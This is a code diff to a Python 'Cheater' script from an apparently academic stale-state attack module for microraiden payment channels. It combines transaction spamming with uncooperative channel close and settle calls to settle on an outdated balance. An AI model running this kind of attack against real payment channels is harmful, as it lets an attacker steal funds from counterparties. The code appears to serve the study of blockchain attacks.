@@ -1,5 +1,6 @@
 #!/usr/bin/python
 
+import rlp
 import logging
 import time
 import datetime
@@ -9,12 +10,12 @@ from microraiden import Client
 from microraiden.utils import privkey_to_addr
 from microraiden.stale_state_attack.utils import (
     send_offchain_payment,
-    create_close_channel_transaction,
-    create_settle_channel_transaction,
     wait_for_open,
     wait_for_close,
     wait_for_settle,
     wait_for_block_generation,
+    get_valid_headers,
+    get_congested_headers,
 )
 from microraiden.stale_state_attack.spamming.spammer import Spammer
 
@@ -179,13 +180,15 @@ class Cheater():
         self.spammer.manager.wait_for_full_tx_queue(self.initial_queue_size)
         self.spammer.sending_continue()
 
-        # Create close channel transaction
-        close_tx = create_close_channel_transaction(
-            channel=self.channel,
-            balance=balance,
-        )
         # Send close channel transaction
-        close_tx_hash = self.web3.eth.sendRawTransaction(close_tx)
+        close_tx_hash = self.channel.core.channel_manager.transact({
+            'from': privkey_to_addr(self.private_key),
+            'gasPrice': 30000000000,
+        }).uncooperativeClose(
+            self.channel.receiver,
+            self.channel.block,
+            balance,
+        )
         self.logger.info('Sent close transaction (tx={})'.format(close_tx_hash.hex()))
 
         # Wait for channel to be closed
@@ -267,12 +270,19 @@ class Cheater():
         wait_for_block_generation(self.web3, settle_block)
         self.logger.info('Challenge period is over.')
 
-        # Create settle transaction
-        settle_tx = create_settle_channel_transaction(self.channel)
-
         try:
+            headers = get_valid_headers(self.web3, 1)
+            rlp_headers = rlp.encode(headers)
+
             # Send settle transaction
-            tx_hash = self.web3.eth.sendRawTransaction(settle_tx)
+            tx_hash = self.channel.core.channel_manager.transact({
+                'from': privkey_to_addr(self.private_key),
+                'gasPrice': 30000000000,
+            }).settle(
+                self.channel.receiver,
+                self.channel.block,
+                rlp_headers,
+            )
             self.logger.info('Sent settle transaction (tx={})'.format(tx_hash.hex()))
         except Exception as e:
             self.logger.error('Sending settle transaction failed: {}'.format(e))
